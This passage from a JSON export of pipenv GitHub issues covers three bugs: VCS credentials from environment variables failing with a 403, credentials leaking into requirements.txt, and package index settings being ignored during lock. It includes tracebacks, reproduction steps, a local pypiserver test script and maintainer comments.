^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/decorators.py\", line 92, in new_func\r\n    return ctx.invoke(f, obj, *args, **kwargs)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 783, in invoke\r\n    return __callback(*args, **kwargs)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/cli/command.py\", line 209, in install\r\n    do_install(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/routines/install.py\", line 93, in do_install\r\n    do_init(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/routines/install.py\", line 653, in do_init\r\n    do_lock(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/routines/lock.py\", line 66, in do_lock\r\n    venv_resolve_deps(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\", line 873, in venv_resolve_deps\r\n    c = resolve(cmd, st, project=project)\r\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\", line 737, in resolve\r\n    raise RuntimeError(\"Failed to lock Pipfile.lock!\")\r\nRuntimeError: Failed to lock Pipfile.lock!\r\n```\r\n</details>\r\n\r\n### Steps to replicate\r\n\r\nfirst\r\n\r\n1. create a private aws codecommit repo with a minimal `pyproject.toml`, as follows, and [setup a user with git credentials][3] (perhaps a private github repo would also work, but haven't tried that yet)\r\n   ```toml\r\n   [build-system]\r\n   requires = [\"setuptools >= 61.0\"]\r\n   build-backend = \"setuptools.build_meta\"\r\n\r\n   [project]\r\n   name = \"mypackage\"\r\n   version = \"0.0.1\"\r\n   ```\r\n2. in a bash terminal on the local system, create env variables `USERNAME` and `PASSWORD` (e.g. using `read -s`) with the corresponding values (url-encoded)\r\n3. create an empty dir, locally, and use pipenv to install the repo, in editable mode (not sure if that matters), as in:\r\n    ```bash\r\n    pipenv install -e \"git+https://${USERNAME}:${PASSWORD}@git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage@main#egg=mypackage\"\r\n    ```\r\n4. observe that this installation succeeds\r\n\r\nthen\r\n\r\n5. in the same terminal, create another empty dir\r\n6. copy the `Pipfile`, generated above, into the new dir, and replace the actual username and password in the file by the corresponding env variables, as in:\r\n   ```toml\r\n   [[source]]\r\n   url = \"https://pypi.org/simple\"\r\n   verify_ssl = true\r\n   name = \"pypi\"\r\n\r\n   [packages]\r\n   mypackage = {editable = true, ref = \"main\", git = \"git+https://${USERNAME}:${PASSWORD}@git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage\"}\r\n\r\n   [dev-packages]\r\n\r\n   [requires]\r\n   python_version = \"3.11\"\r\n   ```\r\n7. run `pipenv install` \r\n8. observe the `status 403` error\r\n\r\n\r\n-------------------------------------------------------------------------------\r\n\r\n<details><summary>$ pipenv --support</summary>\r\n\r\nPipenv version: `'2024.0.1'`\r\n\r\nPipenv location: `'/home/me/.local/lib/python3.11/site-packages/pipenv'`\r\n\r\nPython location: `'/home/me/.pyenv/versions/3.11.6/bin/python3.11'`\r\n\r\nOS Name: `'posix'`\r\n\r\nUser pip version: `'24.0'`\r\n\r\nuser Python installations found:\r\n\r\n\r\nPEP 508 Information:\r\n\r\n```\r\n{'implementation_name': 'cpython',\r\n 'implementation_version': '3.11.6',\r\n 'os_name': 'posix',\r\n 'platform_machine': 'x86_64',\r\n 'platform_python_implementation': 'CPython',\r\n 'platform_release': '6.5.0-41-generic',\r\n 'platform_system': 'Linux',\r\n 'platform_version': '#41~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun  3 '\r\n                     '11:32:55 UTC 2',\r\n 'python_full_version': '3.11.6',\r\n 'python_version': '3.11',\r\n 'sys_platform': 'linux'}\r\n```\r\n\r\nSystem environment variables:\r\n\r\n  - `SHELL`\r\n  - `SESSION_MANAGER`\r\n  - `QT_ACCESSIBILITY`\r\n  - `PIPENV_VENV_IN_PROJECT`\r\n  - `COLORTERM`\r\n  - `PYENV_SHELL`\r\n  - `XDG_CONFIG_DIRS`\r\n  - `SSH_AGENT_LAUNCHER`\r\n  - `XDG_MENU_PREFIX`\r\n  - `GNOME_DESKTOP_SESSION_ID`\r\n  - `LANGUAGE`\r\n  - `LC_ADDRESS`\r\n  - `GNOME_SHELL_SESSION_MODE`\r\n  - `LC_NAME`\r\n  - `SSH_AUTH_SOCK`\r\n  - `GIT_PS1_SHOWDIRTYSTATE`\r\n  - `XMODIFIERS`\r\n  - `DESKTOP_SESSION`\r\n  - `LC_MONETARY`\r\n  - `GTK_MODULES`\r\n  - `PWD`\r\n  - `LOGNAME`\r\n  - `XDG_SESSION_DESKTOP`\r\n  - `XDG_SESSION_TYPE`\r\n  - `SYSTEMD_EXEC_PID`\r\n  - `XAUTHORITY`\r\n  - `HOME`\r\n  - `USERNAME`\r\n  - `IM_CONFIG_PHASE`\r\n  - `LC_PAPER`\r\n  - `LANG`\r\n  - `LS_COLORS`\r\n  - `XDG_CURRENT_DESKTOP`\r\n  - `VTE_VERSION`\r\n  - `WAYLAND_DISPLAY`\r\n  - `GNOME_TERMINAL_SCREEN`\r\n  - `GNOME_SETUP_DISPLAY`\r\n  - `LESSCLOSE`\r\n  - `XDG_SESSION_CLASS`\r\n  - `TERM`\r\n  - `LC_IDENTIFICATION`\r\n  - `LESSOPEN`\r\n  - `USER`\r\n  - `GNOME_TERMINAL_SERVICE`\r\n  - `DISPLAY`\r\n  - `SHLVL`\r\n  - `LC_TELEPHONE`\r\n  - `QT_IM_MODULE`\r\n  - `LC_MEASUREMENT`\r\n  - `PAPERSIZE`\r\n  - `XDG_RUNTIME_DIR`\r\n  - `PYENV_ROOT`\r\n  - `LC_TIME`\r\n  - `XDG_DATA_DIRS`\r\n  - `PATH`\r\n  - `GDMSESSION`\r\n  - `DBUS_SESSION_BUS_ADDRESS`\r\n  - `LC_NUMERIC`\r\n  - `_`\r\n  - `PIP_DISABLE_PIP_VERSION_CHECK`\r\n  - `PYTHONDONTWRITEBYTECODE`\r\n  - `PYTHONFINDER_IGNORE_UNSUPPORTED`\r\n\r\nPipenv–specific environment variables:\r\n\r\n - `PIPENV_VENV_IN_PROJECT`: `1`\r\n\r\nDebug–specific environment variables:\r\n\r\n  - `PATH`: `/home/me/.pyenv/versions/3.9.18/bin:/home/me/.pyenv/versions/3.8.18/bin:/home/me/.pyenv/versions/3.11.6/bin:/home/me/.pyenv/versions/3.8.13/bin:/home/me/.pyenv/shims:/home/me/.npm-global/bin:/home/me/.local/bin:/home/me/.pyenv/bin:/home/me/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin`\r\n  - `SHELL`: `/bin/bash`\r\n  - `LANG`: `en_CA.UTF-8`\r\n  - `PWD`: `/home/me`\r\n\r\n\r\n---------------------------\r\n\r\n</details>\r\n\r\n[1]: https://pip.pypa.io/en/stable/topics/vcs-support/\r\n[2]: https://github.com/pypa/pipenv/blob/main/docs/credentials.md\r\n[3]: https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-gc.html\r\n[4]: https://pipenv.pypa.io/en/latest/credentials.html#injecting-credentials-into-pipfile-via-environment-variables",
                "comments": [
                    {
                        "body": "I am wondering if anyone can setup a sample private repo for testing this case -- I'd like to help improve the code around it.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-07-29T01:50:05Z",
                        "url": "https://github.com/pypa/pipenv/issues/6195#issuecomment-2254789101"
                    },
                    {
                        "body": "@matteius I've tried to reproduce this using one of my private ***github*** repos, because those are easier to set up. However, in this case `pipenv` already fails at replication step 3. mentioned above (non-editable).\r\n\r\nFor example, `pip` succeeds (with github username and fine-grained personal access token as credentials.)\r\n\r\n```bash\r\npip install \"git+https://${USERNAME}:${PASSWORD}@github.com/myusername/my-private-repo.git\"\r\n```\r\nbut `pipenv`, with the same command, same terminal, same credentials\r\n```bash\r\npipenv install \"git+https://${USERNAME}:${PASSWORD}@github.com/myusername/my-private-repo.git\"\r\n```\r\nfails with \r\n```none\r\n...\r\nAdded my-private-repo to Pipfile's [packages] ...\r\n✔ Installation Succeeded\r\nTo activate this project's virtualenv, run pipenv shell.\r\nAlternatively, run a command inside the virtualenv with pipenv run.\r\nInstalling dependencies from Pipfile.lock (13a959)...\r\n[pipenv.exceptions.InstallError]: Collecting my-private-repo@ git+https://myusername:****@0888...b155 (from -r /tmp/pipenv-hhg4plkm-requirements/pipenv-vmlg4kcl-reqs.txt (line 1))\r\n[pipenv.exceptions.InstallError]:   Cloning https://myusername:****@0888...b155 to /tmp/pip-install-_1xf_5i1/my-private-repo_3cef3c3357fd4617av89cf07dea69a8e\r\n[pipenv.exceptions.InstallError]: Running command git clone --filter=blob:none --quiet 'https://myusername:****@0888...b155' /tmp/pip-install-_1xf_5i1/my-private-repo_3cef3c3357fd4617av89cf07dea69a8e\r\n[pipenv.exceptions.InstallError]:   fatal: unable to access 'https://0888...b155/': Could not resolve host: 0888...b155\r\n...\r\nERROR: Couldn't install package: {}\r\nPackage installation failed...\r\n```\r\nIt looks unrelated to the present issue. Should I open a new issue for this?",
                        "user": "dennisvang",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-07-29T10:06:47Z",
                        "url": "https://github.com/pypa/pipenv/issues/6195#issuecomment-2255522497"
                    },
                    {
                        "body": "@dennisvang Could you test this report against this branch with I believe does better with the VCS env variables:  https://github.com/pypa/pipenv/pull/6242",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-09-14T03:03:50Z",
                        "url": "https://github.com/pypa/pipenv/issues/6195#issuecomment-2350804675"
                    },
                    {
                        "body": "## Analysis of Issue #6195: \r\n\r\n### 1. Problem Summary\r\n\r\nThe issue reports a discrepancy in Pipenv's handling of HTTPS credentials for VCS installations when specified via environment variables. While direct command line installation with embedded credentials works as expected, using the same URL format with environment variables in a `Pipfile` leads to a 403 Forbidden error during installation.\r\n\r\n### 2. Comment Discussion Analysis\r\n\r\n- **matteius** seeks help setting up a private repo for testing, indicating an interest in addressing the issue.\r\n- **dennisvang** provides valuable insights by attempting to reproduce the issue with a private Github repository. They note that even direct command-line installation with embedded credentials fails in their case, suggesting a potential broader issue with Pipenv's VCS credential handling.\r\n- **matteius** suggests testing against a specific branch (PR #6242), hinting at potential improvements in VCS environment variable handling.\r\n\r\n### 3. Proposed Resolution\r\n\r\nThe issue likely stems from Pipenv not correctly substituting environment variables within the `Pipfile` before passing the URL to the underlying VCS command. The solution involves ensuring proper variable expansion and possibly refining how credentials are handled during VCS installations. \r\n\r\nHere's a detailed breakdown:\r\n\r\n1. **Variable Expansion:** Pipenv should expand environment variables within the `Pipfile`'s VCS URL before invoking the installation command. This ensures the actual username and password are passed to the VCS tool.\r\n2. **Credential Handling:**  Investigate if the current approach of directly embedding credentials in the URL is the most secure and robust method.  Consider alternative approaches, like using a credential helper or dedicated environment variables for VCS credentials.\r\n3. **Regression Testing:** Thoroughly test various VCS installation scenarios, including different VCS providers (GitHub, CodeCommit, etc.) and credential formats, to ensure the fix effectively addresses the issue and doesn't introduce regressions.\r\n\r\n### 4. Potential Code Changes\r\n\r\n**Enhance `pipenv/utils/project.py`:**\r\n\r\n```python\r\nfrom pipenv.utils.shell import safe_expandvars\r\n\r\nclass Project:\r\n\t  # ... existing code ...\r\n\r\n\t  def get_vcs_deps(self, dev=False):\r\n\t      # ... existing code ...\r\n\r\n\t      # Expand environment variables in the URL.\r\n\t      for k, v in packages.items():\r\n\t          if is_vcs(v) or is_vcs(k):\r\n\t              if isinstance(v, dict):\r\n\t                  for key, value in v.items():\r\n\t                      if key in VCS_LIST:\r\n\t                          v[key] = safe_expandvars(value)\r\n\r\n\t      return packages or {}\r\n\t  # ... existing code ...\r\n```\r\n\r\nThis modification expands environment variables within the VCS URL retrieved from the `Pipfile` before further processing. \r\n\r\n### 5. Additional Steps/Investigations\r\n\r\n- **Review PR #6242:**  Analyze the changes in PR #6242 to understand its impact on VCS credential handling and whether it addresses this specific issue.\r\n- **Explore Credential Helpers:** Investigate if leveraging a VCS credential helper (like the Git Credential Manager) provides a more secure and flexible alternative to embedding credentials in URLs.\r\n- **Security Considerations:**  Thoroughly assess the security implications of the chosen credential handling approach, ensuring no sensitive information is inadvertently exposed or stored insecurely.\r\n\r\nBy addressing the variable expansion issue and potentially refining VCS credential management, Pipenv can ensure consistent and secure handling of private repositories, enhancing its usability and reliability for diverse projects and environments. ",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-10-18T21:25:36Z",
                        "url": "https://github.com/pypa/pipenv/issues/6195#issuecomment-2423254270"
                    },
                    {
                        "body": "Could you check @dennisvang if https://github.com/pypa/pipenv/pull/6276 solves for this (I think it should).",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-10-22T03:46:19Z",
                        "url": "https://github.com/pypa/pipenv/issues/6195#issuecomment-2428150571"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pypa/pipenv/issues/5134",
                "title": "Credentials are leaked in requirements.txt",
                "labels": [
                    "Type: Bug :bug:",
                    "Category: Security"
                ],
                "user": "Grutschus",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5134,
                "id": 1272600147,
                "state": "closed",
                "project_created_at": "2022-06-15T18:39:18Z",
                "closed_at": "2022-06-21T12:29:40Z",
                "body": "### Issue description\r\n\r\nWhen I run `pipenv requirements` with an index-url specified in the pipfile according to [this page in the docs](https://pipenv-fork.readthedocs.io/en/latest/advanced.html#injecting-credentials-into-pipfiles-via-environment-variables), pipenv reveals the credentials in the requirements.txt.\r\n\r\n### Expected result\r\n\r\nI'd expect the requirements.txt to contain a reference to the environment variable, just like in the `Pipfile.lock`.\r\n\r\n### Actual result\r\n\r\nThe credentials are clearly visible in the requirements.txt.\r\n\r\n### Steps to replicate\r\n\r\n```\r\nmkdir my_project\r\ncd my_project\r\n\r\ntouch Pipfile\r\npipenv install\r\n```\r\n\r\nAdd you private pypi repo to the `pipfile`.\r\n\r\n```\r\npipenv requirements\r\n```\r\n\r\n-------------------------------------------------------------------------------\r\n\r\nPlease run `$ pipenv --support`, and paste the results here. Don't put backticks (`` ` ``) around it! The output already contains Markdown formatting.\r\n\r\n<details><summary>$ pipenv --support</summary>\r\n\r\nPipenv version: `'2022.6.7'`\r\n\r\nPipenv location: `'/anaconda/lib/python3.8/site-packages/pipenv'`\r\n\r\nPython location: `'/anaconda/bin/python'`\r\n\r\nPython installations found:\r\n\r\n  - `3.8.10`: `/anaconda/bin/python3`\r\n  - `3.8.10`: `/anaconda/bin/python`\r\n  - `3.8.10`: `/anaconda/bin/python3.8`\r\n  - `3.6.9`: `/usr/bin/python3.6`\r\n  - `3.6.9`: `/usr/bin/python3.6m`\r\n  - `3.6.9`: `/usr/bin/python3`\r\n  - `2.7.17`: `/usr/bin/python2`\r\n  - `2.7.17`: `/usr/bin/python2.7`\r\n  - `2.7.17`: `/usr/bin/python`\r\n\r\nPEP 508 Information:\r\n\r\n```\r\n{'implementation_name': 'cpython',\r\n 'implementation_version': '3.8.10',\r\n 'os_name': 'posix',\r\n 'platform_machine': 'x86_64',\r\n 'platform_python_implementation': 'CPython',\r\n 'platform_release': '5.4.0-1068-azure',\r\n 'platform_system': 'Linux',\r\n 'platform_version': '#71~18.04.1-Ubuntu SMP Thu Jan 20 08:21:40 UTC 2022',\r\n 'python_full_version': '3.8.10',\r\n 'python_version': '3.8',\r\n 'sys_platform': 'linux'}\r\n```\r\n\r\nSystem environment variables:\r\n\r\n  - `CONDA_SHLVL`\r\n  - `MSI_ENDPOINT`\r\n  - `LS_COLORS`\r\n  - `LD_LIBRARY_PATH`\r\n  - `CONDA_EXE`\r\n  - `JUPYTER_SERVER_ROOT`\r\n  - `LESSCLOSE`\r\n  - `LANG`\r\n  - `AZURE_EXTENSION_DIR`\r\n  - `MSI_SECRET_JOB`\r\n  - `OLDPWD`\r\n  - `INVOCATION_ID`\r\n  - `CI_RESOURCE_GROUP`\r\n  - `NODE_PATH`\r\n  - `OBO_ENDPOINT`\r\n  - `COLORTERM`\r\n  - `JUPYTER_SERVER_URL`\r\n  - `CONDA_PREFIX`\r\n  - `VSCODE_GIT_ASKPASS_EXTRA_ARGS`\r\n  - `CLASSPATH`\r\n  - `USER`\r\n  - `AML_CloudName`\r\n  - `CI_WORKSPACE`\r\n  - `MKL_THREADING_LAYER`\r\n  - `PWD`\r\n  - `LINES`\r\n  - `HOME`\r\n  - `CONDA_PYTHON_EXE`\r\n  - `BROWSER`\r\n  - `JOURNAL_STREAM`\r\n  - `VSCODE_GIT_ASKPASS_NODE`\r\n  - `TERM_PROGRAM`\r\n  - `TERM_PROGRAM_VERSION`\r\n  - `CUPIT_LIB_PATH`\r\n  - `XDG_DATA_DIRS`\r\n  - `DEFAULT_IDENTITY_CLIENT_ID`\r\n  - `APPSETTING_WEBSITE_SITE_NAME`\r\n  - `VSCODE_IPC_HOOK_CLI`\r\n  - `CUDA_ROOT`\r\n  - `LIBRARY_PATH`\r\n  - `CONDA_PROMPT_MODIFIER`\r\n  - `COLUMNS`\r\n  - `CI_NAME`\r\n  - `VSCODE_GIT_ASKPASS_MAIN`\r\n  - `SHELL`\r\n  - `TERM`\r\n  - `MSI_SECRET`\r\n  - `AZURE_ARTIFACTS_PAT`\r\n  - `PYXTERM_DIMENSIONS`\r\n  - `SHLVL`\r\n  - `CI_LOCAL_UBUNTU_USER`\r\n  - `VSCODE_GIT_IPC_HANDLE`\r\n  - `MANPATH`\r\n  - `LOGNAME`\r\n  - `MLFLOW_TRACKING_URI`\r\n  - `GIT_ASKPASS`\r\n  - `ENABLE_MLFLOW_AUTOLOG`\r\n  - `PATH`\r\n  - `CONDA_DEFAULT_ENV`\r\n  - `I_MPI_ROOT`\r\n  - `LESSOPEN`\r\n  - `_`\r\n  - `PIP_SHIMS_BASE_MODULE`\r\n  - `PIP_DISABLE_PIP_VERSION_CHECK`\r\n  - `PIP_PYTHON_PATH`\r\n  - `PYTHONDONTWRITEBYTECODE`\r\n  - `PYTHONFINDER_IGNORE_UNSUPPORTED`\r\n\r\nPipenv–specific environment variables:\r\n\r\n\r\nDebug–specific environment variables:\r\n\r\n\r\n---------------------------\r\n\r\nContents of `Pipfile`:\r\n\r\n```toml\r\n[[source]]\r\nurl = \"https://user:${AZURE_ARTIFACTS_PAT}@pkgs.dev.azure.com/my-project/pypi/simple/\"\r\nverify_ssl = true\r\nname = \"my-stream\"\r\n\r\n[packages]\r\nmy-package = \"*\"\r\n\r\n[dev-packages]\r\n\r\n[requires]\r\npython_version = \"3.8.10\"\r\n\r\n```\r\n\r\n\r\nContents of `Pipfile.lock`:\r\n\r\n```json\r\n{\r\n    \"_meta\": {\r\n        \"hash\": {\r\n            \"sha256\": \"3349f2aaf4cd14ce1860f4c6971a3b3b4f0971f8ea30da5919c2542386512c28\"\r\n        },\r\n        \"pipfile-spec\": 6,\r\n        \"requires\": {\r\n            \"python_version\": \"3.8.10\"\r\n        },\r\n        \"sources\": [\r\n            {\r\n                \"name\": \"my-stream\",\r\n                \"url\": \"https://user:${AZURE_ARTIFACTS_PAT}@pkgs.dev.azure.com/my-project/pypi/simple/\",\r\n                \"verify_ssl\": true\r\n            }\r\n        ]\r\n    },\r\n    \"default\": {\r\n        \"my-package\": {\r\n            \"hashes\": [\r\n                \"sha256:c49c1166e35955b2f817bca7f2f9a0854b5995a8f8173e1dc525024475f4756e\",\r\n                \"sha256:e4345b3f508c33f582ab59e9f69707bc8f764c96ea5434e9adbfc344cd1aee80\"\r\n            ],\r\n            \"index\": \"my-package\",\r\n            \"version\": \"==0.1.6\"\r\n        },\r\n    \"develop\": {}\r\n}\r\n\r\n```\r\n</details>\r\n",
                "comments": [
                    {
                        "body": "Hey @ImreC here is another refinement requested for the `requirements` command -- I defer to you if you can have a look at this when you find time?  I think we are getting close to solving some of the last edge cases of the command preventing us from dropping the the `lock -r` version.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-06-16T00:46:57Z",
                        "url": "https://github.com/pypa/pipenv/issues/5134#issuecomment-1157108063"
                    },
                    {
                        "body": "Hey hey,\r\njust tried to fix the issue myself in #5139. Hope this helps :)",
                        "user": "ghost",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-20T18:01:27Z",
                        "url": "https://github.com/pypa/pipenv/issues/5134#issuecomment-1160714691"
                    },
                    {
                        "body": "Thanks for your contribution. The issue is now fixed.",
                        "user": "oz123",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-21T12:29:40Z",
                        "url": "https://github.com/pypa/pipenv/issues/5134#issuecomment-1161684288"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pypa/pipenv/issues/4637",
                "title": "Pipenv Lock (Or Install) Does Not Respect Index Specified For A Package",
                "labels": [
                    "Type: Bug :bug:",
                    "Category: Dependency Resolution",
                    "Category: Private PyPIs :sunglasses:",
                    "Priority: Critical",
                    "Category: Security"
                ],
                "user": "janneronkko",
                "issue_author_association": "NONE",
                "number": 4637,
                "id": 817536879,
                "state": "closed",
                "project_created_at": "2021-02-26T17:31:05Z",
                "closed_at": "2022-03-22T03:58:56Z",
                "body": "### Issue description\r\n\r\nIndex argument for a package is not respected\r\n\r\n### Expected result\r\n\r\nPipenv only installs (locks) versions from specified package index.\r\n\r\n### Actual result\r\n\r\nPipenv installs (locks) the package with greatest version from a package index not specified in the Pipfile.\r\n\r\n### Steps to replicate\r\n\r\nRun the following script:\r\n\r\n```sh\r\n#! /usr/bin/env bash\r\n\r\nset -euxo pipefail\r\n\r\n\r\nfunction finish {\r\n  set +e\r\n\r\n  kill -9 ${PYPI_SERVER1_PID} || true\r\n  kill -9 ${PYPI_SERVER2_PID} || true\r\n}\r\n\r\ntrap finish EXIT\r\n\r\ncat > example.py <<EOF\r\nimport pkg_resources\r\n\r\ndef main():\r\n    print(pkg_resources.get_distribution('example'))\r\nEOF\r\n\r\ncat > setup.py <<EOF\r\nimport os\r\n\r\nimport setuptools\r\n\r\nsetuptools.setup(\r\n    name='example',\r\n    version=os.environ['EXAMPLE_VERSION'],\r\n    description='Example package',\r\n    py_modules=['example'],\r\n    python_requires='>=3.6',\r\n    entry_points={\r\n        'console_scripts': [\r\n            'show-installed-package = example:main',\r\n        ],\r\n    },\r\n)\r\nEOF\r\n\r\nEXAMPLE_VERSION=1 python setup.py bdist_wheel\r\nEXAMPLE_VERSION=2 python setup.py bdist_wheel\r\n\r\npython -m venv venv\r\nvenv/bin/pip install pypiserver\r\n\r\nmkdir -p server1 server2\r\ncp dist/example-1-py3-none-any.whl server1/\r\ncp dist/example-2-py3-none-any.whl server2/\r\n\r\nfunction run_pypi_server() {\r\n  venv/bin/pypi-server \\\r\n    -p 808${1} \\\r\n    -i 127.0.0.1 \\\r\n    server${1}/ 2> pypi-server${1}.log &\r\n}\r\n\r\nrun_pypi_server 1\r\nPYPI_SERVER1_PID=$!\r\n\r\nrun_pypi_server 2\r\nPYPI_SERVER2_PID=$!\r\n\r\nrm -f Pipfile.lock\r\n\r\ncat > Pipfile <<EOF\r\n[[source]]\r\nurl = \"http://127.0.0.1:8081\"\r\nname = \"server1\"\r\n\r\n[[source]]\r\nurl = \"http://127.0.0.1:8082\"\r\nname = \"server2\"\r\n\r\n[packages]\r\nexample = {version=\"*\", index=\"server1\"}\r\n\r\n[dev-packages]\r\n\r\n[requires]\r\npython_version = \"$(python -c 'import sys; print(f\"{sys.version_info.major}.{sys.version_info.minor}\")')\"\r\nEOF\r\n\r\npipenv lock\r\npipenv sync\r\npipenv run show-installed-package\r\n\r\n```\r\n\r\nThe script creates two versions of _example_ Python packge (version 1 and 2). Then it starts pypi server; server 1 contains example version 1 and server 2 contains example version 2.\r\n\r\nThe Pipfile states that _example_ package of any version should be installed from index _server1_ (that contains only version 1 of example package).\r\n\r\nThe result is that version 2 of example package is installed (from server 2)\r\n\r\nDocumentation (https://pipenv.pypa.io/en/latest/advanced/#specifying-package-indexes) states:\r\n\r\n> If you’d like a specific package to be installed with a specific package index, you can do the following:\r\n\r\n-------------------------------------------------------------------------------\r\n\r\n<details><summary>$ pipenv --support</summary>\r\n\r\nPipenv version: `'2020.11.15'`\r\n\r\nPipenv location: `'/usr/lib/python3.9/site-packages/pipenv'`\r\n\r\nPython location: `'/usr/bin/python'`\r\n\r\nPython installations found:\r\n\r\n  - `3.9.2`: `/usr/bin/python3.9`\r\n  - `3.9.2`: `/usr/bin/python3`\r\n  - `3.7.9`: `/usr/bin/pypy3`\r\n  - `2.7.18`: `/usr/bin/python2.7`\r\n  - `2.7.18`: `/usr/bin/python2`\r\n\r\nPEP 508 Information:\r\n\r\n```\r\n{'implementation_name': 'cpython',\r\n 'implementation_version': '3.9.2',\r\n 'os_name': 'posix',\r\n 'platform_machine': 'x86_64',\r\n 'platform_python_implementation': 'CPython',\r\n 'platform_release': '5.11.1-arch1-1',\r\n 'platform_system': 'Linux',\r\n 'platform_version': '#1 SMP PREEMPT Tue, 23 Feb 2021 14:05:30 +0000',\r\n 'python_full_version': '3.9.2',\r\n 'python_version': '3.9',\r\n 'sys_platform': 'linux'}\r\n```\r\n\r\nSystem environment variables:\r\n\r\n  - `SHELL`\r\n  - `SESSION_MANAGER`\r\n  - `WINDOWID`\r\n  - `QT_SCREEN_SCALE_FACTORS`\r\n  - `COLORTERM`\r\n  - `XDG_SESSION_PATH`\r\n  - `HISTCONTROL`\r\n  - `TMUX`\r\n  - `HISTSIZE`\r\n  - `LANGUAGE`\r\n  - `LC_ADDRESS`\r\n  - `LC_NAME`\r\n  - `SSH_AUTH_SOCK`\r\n  - `HISTTIMEFORMAT`\r\n  - `SHELL_SESSION_ID`\r\n  - `DESKTOP_SESSION`\r\n  - `LC_MONETARY`\r\n  - `SSH_AGENT_PID`\r\n  - `GTK_RC_FILES`\r\n  - `XCURSOR_SIZE`\r\n  - `CLOUDSDK_PYTHON_ARGS`\r\n  - `EDITOR`\r\n  - `GTK_MODULES`\r\n  - `XDG_SEAT`\r\n  - `PWD`\r\n  - `XDG_SESSION_DESKTOP`\r\n  - `LOGNAME`\r\n  - `XDG_SESSION_TYPE`\r\n  - `XAUTHORITY`\r\n  - `MOTD_SHOWN`\r\n  - `GTK2_RC_FILES`\r\n  - `HOME`\r\n  - `LC_PAPER`\r\n  - `LANG`\r\n  - `HISTFILE`\r\n  - `XDG_CURRENT_DESKTOP`\r\n  - `KONSOLE_DBUS_SERVICE`\r\n  - `CLOUDSDK_ROOT_DIR`\r\n  - `KONSOLE_DBUS_SESSION`\r\n  - `PROFILEHOME`\r\n  - `XDG_SEAT_PATH`\r\n  - `KONSOLE_VERSION`\r\n  - `KDE_SESSION_UID`\r\n  - `CLOUDSDK_PYTHON`\r\n  - `XDG_SESSION_CLASS`\r\n  - `TERM`\r\n  - `LC_IDENTIFICATION`\r\n  - `GOOGLE_CLOUD_SDK_HOME`\r\n  - `USER`\r\n  - `TMUX_PANE`\r\n  - `COLORFGBG`\r\n  - `KDE_SESSION_VERSION`\r\n  - `PAM_KWALLET5_LOGIN`\r\n  - `VISUAL`\r\n  - `DISPLAY`\r\n  - `SHLVL`\r\n  - `LC_TELEPHONE`\r\n  - `LC_MESSAGES`\r\n  - `LC_MEASUREMENT`\r\n  - `XDG_VTNR`\r\n  - `XDG_SESSION_ID`\r\n  - `MOZ_PLUGIN_PATH`\r\n  - `LC_CTYPE`\r\n  - `XDG_RUNTIME_DIR`\r\n  - `LC_TIME`\r\n  - `QT_AUTO_SCREEN_SCALE_FACTOR`\r\n  - `LC_COLLATE`\r\n  - `XCURSOR_THEME`\r\n  - `KDE_FULL_SESSION`\r\n  - `PATH`\r\n  - `HISTFILESIZE`\r\n  - `DBUS_SESSION_BUS_ADDRESS`\r\n  - `KDE_APPLICATIONS_AS_SCOPE`\r\n  - `HG`\r\n  - `MAIL`\r\n  - `LC_NUMERIC`\r\n  - `OLDPWD`\r\n  - `_`\r\n  - `PIP_DISABLE_PIP_VERSION_CHECK`\r\n  - `PYTHONDONTWRITEBYTECODE`\r\n  - `PIP_SHIMS_BASE_MODULE`\r\n  - `PIP_PYTHON_PATH`\r\n  - `PYTHONFINDER_IGNORE_UNSUPPORTED`\r\n\r\nPipenv–specific environment variables:\r\n\r\n\r\nDebug–specific environment variables:\r\n\r\n  - `PATH`: `/home/janne/bin:/usr/lib/colorgcc/bin:/opt/google-cloud-sdk/bin:/home/janne/bin:/usr/lib/colorgcc/bin:/home/janne/bin:/usr/lib/colorgcc/bin:/opt/google-cloud-sdk/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/usr/lib/jvm/default/bin`\r\n  - `SHELL`: `/bin/bash`\r\n  - `EDITOR`: `vim`\r\n  - `LANG`: `en_US.UTF-8`\r\n  - `PWD`: `/home/janne/tmp/pipenvbug`\r\n\r\n\r\n---------------------------\r\n\r\nContents of `Pipfile` ('/home/janne/tmp/pipenvbug/Pipfile'):\r\n\r\n```toml\r\n[[source]]\r\nurl = \"http://127.0.0.1:8081\"\r\nname = \"server1\"\r\n\r\n[[source]]\r\nurl = \"http://127.0.0.1:8082\"\r\nname = \"server2\"\r\n\r\n[packages]\r\nexample = {version=\"*\", 